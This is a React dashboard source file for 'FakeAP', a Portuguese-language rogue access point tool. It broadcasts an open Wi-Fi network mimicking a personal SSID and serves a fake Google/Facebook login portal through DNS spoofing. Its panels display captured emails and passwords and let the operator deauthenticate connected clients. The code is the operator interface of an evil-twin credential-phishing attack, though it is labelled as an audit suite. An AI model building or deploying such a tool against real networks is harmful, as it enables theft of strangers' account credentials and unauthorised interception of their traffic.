import { useState, useEffect, useCallback } from "react"
import {
  Wifi, ShieldAlert, Users, Key, Terminal, Settings, Play, Square,
  Network, Cpu, Radio, Globe, ExternalLink, AlertTriangle, WifiOff,
  CheckCircle, Info, RefreshCw
} from "lucide-react"
import { getStatus, getClients, getCredentials, getLogs, toggleAp, kickClient } from "./api"
import Toast from "./Toast"
import Clients from "./Clients"
import Credentials from "./Credentials"
import Logs from "./Logs"

export default function App() {
  const [activeTab, setActiveTab] = useState("dashboard")
  const [status, setStatus] = useState({ ap_running: false, clients_count: 0, ssid: "Lucas_2GHz" })
  const [clients, setClients] = useState([])
  const [credentials, setCredentials] = useState([])
  const [logs, setLogs] = useState([])
  const [notification, setNotification] = useState(null)
  const [uptime, setUptime] = useState(0)

  const showToast = useCallback((message, type = "info") => {
    setNotification({ message, type })
    setTimeout(() => setNotification(null), 4000)
  }, [])

  const fetchData = useCallback(async () => {
    try {
      const s = await getStatus()
      setStatus(s)
      if (s.ap_running) setUptime(s.uptime)
      const c = await getClients()
      setClients(c)
      const cr = await getCredentials()
      setCredentials(cr)
      const l = await getLogs()
      setLogs(l)
    } catch (e) {
      /* silently retry */
    }
  }, [])

  useEffect(() => { fetchData(); const i = setInterval(fetchData, 5000); return () => clearInterval(i) }, [fetchData])

  const addLogEntry = useCallback((service, message, level = "info") => {
    const time = new Date().toLocaleTimeString()
    setLogs(prev => [...prev, `[${time}] [${level.toUpperCase()}] [${service}] ${message}`])
  }, [])

  const handleToggleAp = async () => {
    try {
      const r = await toggleAp()
      if (r.status === "started") {
        showToast("FakeAP iniciado com sucesso!", "success")
        addLogEntry("system", "FakeAP iniciado pelo administrador.", "success")
      } else {
        showToast("FakeAP parado.", "warning")
        addLogEntry("system", "FakeAP parado pelo administrador.", "warning")
      }
      await fetchData()
    } catch (e) {
      showToast("Erro ao controlar AP", "danger")
    }
  }

  const handleKick = async (mac, hostname) => {
    try {
      await kickClient(mac)
      showToast(`${hostname} desconectado da rede`, "info")
      addLogEntry("hostapd", `Cliente ${mac} deautenticado manualmente (Kicked)`, "warning")
      await fetchData()
    } catch (e) {
      showToast("Erro ao desconectar", "danger")
    }
  }

  const formatUptime = (s) => {
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), sec = s % 60
    return `${h.toString().padStart(2, "0")}:${m.toString().padStart(2, "0")}:${sec.toString().padStart(2, "0")}`
  }

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 font-sans flex flex-col antialiased">
      <Toast notification={notification} />

      {/* HEADER */}
      <header className="bg-slate-900 border-b border-slate-800 px-6 py-4 flex flex-col md:flex-row justify-between items-center gap-4">
        <div className="flex items-center gap-3">
          <div className={`p-2 rounded-lg ${status.ap_running ? "bg-emerald-500/10 text-emerald-400 animate-pulse" : "bg-slate-800 text-slate-400"}`}>
            <Wifi className="h-6 w-6" />
          </div>
          <div>
            <h1 className="text-xl font-bold tracking-wider text-slate-50 flex items-center gap-2">
              FakeAP <span className="text-xs bg-slate-800 px-2 py-0.5 rounded text-indigo-400 border border-slate-700">v2.4</span>
            </h1>
            <p className="text-xs text-slate-400">Suite de Auditoria — Rogue Access Point</p>
          </div>
        </div>
        <div className="flex flex-wrap items-center gap-3 md:gap-6">
          <div className="flex items-center gap-2 bg-slate-950 px-3 py-1.5 rounded-md border border-slate-800">
            <Radio className="h-4 w-4 text-indigo-400" />
            <div className="text-left">
              <p className="text-[10px] text-slate-500 uppercase font-semibold">SSID</p>
              <p className="text-xs font-mono font-bold text-slate-300">{status.ssid}</p>
            </div>
          </div>
          <div className="flex items-center gap-2 bg-slate-950 px-3 py-1.5 rounded-md border border-slate-800">
            <span className={`h-2.5 w-2.5 rounded-full ${status.ap_running ? "bg-emerald-500 animate-pulse" : "bg-rose-500"}`} />
            <div className="text-left">
              <p className="text-[10px] text-slate-500 uppercase font-semibold">Estado AP</p>
              <p className="text-xs font-mono font-bold text-slate-300">{status.ap_running ? "Ativo" : "Parado"}</p>
            </div>
          </div>
          <button onClick={handleToggleAp}
            className={`flex items-center gap-2 px-4 py-2 rounded-md font-bold text-sm tracking-wide transition-all duration-300 shadow-md ${
              status.ap_running
                ? "bg-rose-600 hover:bg-rose-500 text-white shadow-rose-900/20"
                : "bg-emerald-600 hover:bg-emerald-500 text-white shadow-emerald-900/20"
            }`}>
            {status.ap_running ? <><Square className="h-4 w-4 fill-white" /><span>PARAR AP</span></> : <><Play className="h-4 w-4 fill-white" /><span>INICIAR AP</span></>}
          </button>
        </div>
      </header>

      <div className="flex-1 flex flex-col lg:flex-row">
        {/* SIDEBAR */}
        <aside className="w-full lg:w-64 bg-slate-900/80 border-b lg:border-b-0 lg:border-r border-slate-800 p-4 space-y-2">
          <p className="text-[11px] font-bold text-slate-500 uppercase px-3 tracking-widest mb-3">Auditoria e Controlo</p>
          <nav className="space-y-1">
            {[
              { id: "dashboard", icon: <Network className="h-4 w-4" />, label: "Ecrã Principal", badge: "Live" },
              { id: "clients", icon: <Users className="h-4 w-4" />, label: "Clientes Conectados", count: clients.length, countColor: "emerald" },
              { id: "credentials", icon: <Key className="h-4 w-4" />, label: "Credenciais Capturadas", count: credentials.length, countColor: "rose" },
              { id: "logs", icon: <Terminal className="h-4 w-4" />, label: "Visualizador de Logs" },
            ].map(t => (
              <button key={t.id} onClick={() => setActiveTab(t.id)}
                className={`w-full flex items-center justify-between px-3 py-2.5 rounded-md text-sm font-medium transition-all ${
                  activeTab === t.id
                    ? "bg-indigo-600 text-white font-semibold"
                    : "text-slate-400 hover:bg-slate-800/60 hover:text-slate-200"
                }`}>
                <div className="flex items-center gap-2.5">{t.icon}<span>{t.label}</span></div>
                {t.badge && <span className="text-[10px] bg-slate-950 text-indigo-400 px-1.5 py-0.5 rounded font-bold border border-slate-800">{t.badge}</span>}
                {t.count !== undefined && t.count > 0 && (
                  <span className={`text-xs bg-slate-950 font-mono px-2 py-0.5 rounded-full border border-slate-800 text-${t.countColor}-400`}>{t.count}</span>
                )}
              </button>
            ))}
          </nav>
        </aside>

        {/* CONTEÚDO */}
        <main className="flex-1 p-6 overflow-y-auto space-y-6">
          {!status.ap_running && (
            <div className="bg-amber-950/20 border border-amber-800/40 rounded-lg p-4 flex items-start gap-3">
              <AlertTriangle className="h-5 w-5 text-amber-500 flex-shrink-0 mt-0.5" />
              <div>
                <h4 className="text-sm font-bold text-amber-300">O FakeAP está atualmente desligado</h4>
                <p className="text-xs text-amber-400/80 mt-1">Ative o serviço FakeAP no canto superior direito para começar a transmitir/interceptar.</p>
              </div>
            </div>
          )}

          {/* DASHBOARD */}
          {activeTab === "dashboard" && (
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 xl:grid-cols-4 gap-4">
                <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex items-center justify-between">
                  <div><p className="text-xs text-slate-400 font-medium">Tempo em Execução</p><p className="text-2xl font-mono font-bold text-slate-100 mt-1">{status.ap_running ? formatUptime(uptime) : "00:00:00"}</p></div>
                  <div className="p-3 bg-slate-950 rounded-full border border-slate-800"><RefreshCw className={`h-5 w-5 text-indigo-400 ${status.ap_running ? "animate-spin" : ""}`} /></div>
                </div>
                <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex items-center justify-between">
                  <div><p className="text-xs text-slate-400 font-medium">Clientes Ativos</p><p className="text-2xl font-mono font-bold text-emerald-400 mt-1">{status.ap_running ? clients.filter(c => c.online).length : 0}</p></div>
                  <div className="p-3 bg-slate-950 rounded-full border border-slate-800"><Users className="h-5 w-5 text-emerald-400" /></div>
                </div>
                <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex items-center justify-between">
                  <div><p className="text-xs text-slate-400 font-medium">Credenciais Capturadas</p><p className="text-2xl font-mono font-bold text-rose-500 mt-1">{credentials.length}</p></div>
                  <div className="p-3 bg-slate-950 rounded-full border border-slate-800"><Key className="h-5 w-5 text-rose-500 animate-pulse" /></div>
                </div>
                <div className="bg-slate-900 border border-slate-800 rounded-lg p-4 flex items-center justify-between">
                  <div><p className="text-xs text-slate-400 font-medium">Dispositivos Conectados</p><p className="text-2xl font-mono font-bold text-slate-100 mt-1">{clients.length}</p></div>
                  <div className="p-3 bg-slate-950 rounded-full border border-slate-800"><Radio className="h-5 w-5 text-cyan-400" /></div>
                </div>
              </div>

              <div className="grid grid-cols-1 xl:grid-cols-3 gap-6">
                <div className="xl:col-span-2 bg-slate-900 border border-slate-800 rounded-lg p-5 space-y-4">
                  <div className="flex justify-between items-center border-b border-slate-800 pb-3">
                    <h3 className="font-bold text-slate-200 flex items-center gap-2"><Radio className="h-4 w-4 text-indigo-400" /> Especificações do Ponto de Acesso</h3>
                    <span className="text-xs text-slate-500 font-mono">Modo: Rogue AP</span>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <p className="text-[10px] text-slate-500 uppercase font-semibold">SSID Ativo</p>
                      <p className="text-sm font-mono font-bold text-slate-100 flex items-center gap-2 mt-1"><Wifi className="h-3.5 w-3.5 text-emerald-500" />{status.ssid}</p>
                    </div>
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <p className="text-[10px] text-slate-500 uppercase font-semibold">Canal</p>
                      <p className="text-sm font-mono font-bold text-slate-100 mt-1">Canal {status.channel} <span className="text-xs text-slate-400">(2.412 GHz)</span></p>
                    </div>
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <p className="text-[10px] text-slate-500 uppercase font-semibold">Interface</p>
                      <p className="text-sm font-mono font-bold text-slate-100 mt-1">{status.interface || "buS1"}</p>
                    </div>
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                      <p className="text-[10px] text-slate-500 uppercase font-semibold">Tipo de Segurança</p>
                      <p className="text-sm font-mono font-bold text-amber-500 flex items-center gap-2 mt-1"><WifiOff className="h-3.5 w-3.5" /> Aberta (Sem Senha)</p>
                    </div>
                  </div>
                </div>

                <div className="bg-slate-900 border border-slate-800 rounded-lg p-5 flex flex-col justify-between space-y-4">
                  <div className="space-y-3">
                    <div className="flex justify-between items-center border-b border-slate-800 pb-3">
                      <h3 className="font-bold text-slate-200 flex items-center gap-2"><Globe className="h-4 w-4 text-emerald-400" /> Portal Ativo</h3>
                      <span className="text-xs bg-slate-950 text-emerald-400 px-2 py-0.5 rounded border border-slate-800">WEB</span>
                    </div>
                    <div className="bg-slate-950 p-3 rounded-lg border border-slate-800 space-y-1">
                      <p className="text-[10px] text-slate-500 uppercase font-semibold">Serviço</p>
                      <h4 className="text-sm font-bold text-slate-100">Login Google / Facebook</h4>
                      <p className="text-xs text-slate-400">Captura credenciais via portal falso com DNS spoofing.</p>
                    </div>
                  </div>
                  <div className="bg-slate-950 p-2.5 rounded border border-slate-800/80 text-xs font-mono text-slate-400 flex items-center justify-between">
                    <span>IP do Servidor: <strong className="text-slate-200">192.168.50.1</strong></span>
                    <span className="text-indigo-400 flex items-center gap-1"><ExternalLink className="h-3 w-3" /> Porta 8080</span>
                  </div>
                </div>
              </div>

              <div className="grid grid-cols-1 xl:grid-cols-2 gap-6">
                <div className="bg-slate-900 border border-slate-800 rounded-lg p-5">
                  <div className="flex justify-between items-center mb-4">
                    <h3 className="font-bold text-slate-200 flex items-center gap-2"><Users className="h-4 w-4 text-indigo-400" /> Clientes Ativos ({clients.filter(c => c.online).length})</h3>
                    <button onClick={() => setActiveTab("clients")} className="text-xs text-indigo-400 hover:underline">Ver Todos</button>
                  </div>
                  <div className="overflow-x-auto">
                    <table className="w-full text-left text-xs border-collapse">
                      <thead><tr className="border-b border-slate-800 text-slate-400">
                        <th className="py-2 font-semibold">Cliente</th><th className="py-2 font-semibold">IP</th><th className="py-2 font-semibold">Sinal</th><th className="py-2 font-semibold text-right">Ação</th>
                      </tr></thead>
                      <tbody className="divide-y divide-slate-800/50">
                        {clients.filter(c => c.online).slice(0, 3).map((c, i) => (
                          <tr key={i} className="hover:bg-slate-800/20">
                            <td className="py-3"><p className="font-bold text-slate-200">{c.hostname}</p><p className="text-[10px] font-mono text-slate-500">{c.mac}</p></td>
                            <td className="py-3 font-mono text-slate-300">{c.ip}</td>
                            <td className="py-3 font-mono text-slate-300">{c.signal !== "N/A" ? `${c.signal} dBm` : "—"}</td>
                            <td className="py-3 text-right">
                              <button onClick={() => handleKick(c.mac, c.hostname)} className="bg-slate-800 hover:bg-rose-950/40 hover:text-rose-400 text-slate-400 p-1 rounded border border-slate-700/60 transition-all" title="Desconectar"><WifiOff className="h-3.5 w-3.5" /></button>
                            </td>
                          </tr>
                        ))}
                        {clients.filter(c => c.online).length === 0 && <tr><td colSpan="4" className="text-center py-6 text-slate-500 font-medium">Sem clientes conectados.</td></tr>}
                      </tbody>
                    </table>
                  </div>
                </div>
                <div className="bg-slate-900 border border-slate-800 rounded-lg p-5">
                  <div className="flex justify-between items-center mb-4">
                    <h3 className="font-bold text-slate-200 flex items-center gap-2"><Key className="h-4 w-4 text-rose-500" /> Últimas Credenciais</h3>
                    <button onClick={() => setActiveTab("credentials")} className="text-xs text-rose-400 hover:underline">Ver Tudo</button>
                  </div>
                  <div className="space-y-3">
                    {credentials.slice(0, 2).map((cred, i) => (
                      <div key={i} className="bg-slate-950 p-3 rounded-lg border border-slate-800">
                        <div className="flex items-center gap-2 mb-1">
                          <span className="text-[10px] bg-indigo-950 text-indigo-400 px-2 py-0.5 rounded border border-indigo-900/30 font-semibold">{cred.provider || "Portal"}</span>
                          <span className="text-[10px] text-slate-500 font-mono">{cred.timestamp}</span>
                        </div>
                        <p className="text-xs text-slate-300">Email: <strong className="text-slate-100 font-mono">{cred.email || "—"}</strong></p>
                        <p className="text-xs text-slate-300">Senha: <strong className="text-emerald-400 font-mono">{cred.senha || "—"}</strong></p>
                      </div>
                    ))}
                    {credentials.length === 0 && <div className="text-center py-6 text-slate-500 font-medium">A aguardar submissões...</div>}
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* CLIENTS */}
          {activeTab === "clients" && <Clients clients={clients} onKick={handleKick} onRefresh={fetchData} />}

          {/* CREDENTIALS */}
          {activeTab === "credentials" && <Credentials credentials={credentials} />}

          {/* LOGS */}
          {activeTab === "logs" && <Logs logs={logs} />}

        </main>
      </div>
    </div>
  )
}